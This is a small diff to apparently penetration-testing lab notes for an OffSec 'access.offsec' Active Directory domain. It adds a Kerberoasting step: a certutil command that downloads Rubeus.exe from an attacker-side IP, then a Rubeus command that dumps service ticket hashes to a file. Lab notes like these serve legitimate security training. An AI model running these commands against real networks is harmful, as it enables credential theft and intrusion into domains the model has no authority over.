@@ -966,6 +966,9 @@ Object Cat. =  CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
 servicePrincipalNames
 SPN( 1 )   =       MSSQLSvc/DC.access.offsec
 
+# roasting
+certutil -urlcache -split -f http://192.168.45.192/Rubeus.exe
+.\Rubeus.exe kerberoast /outfile:kerberoast.hashes
 
 ```
 
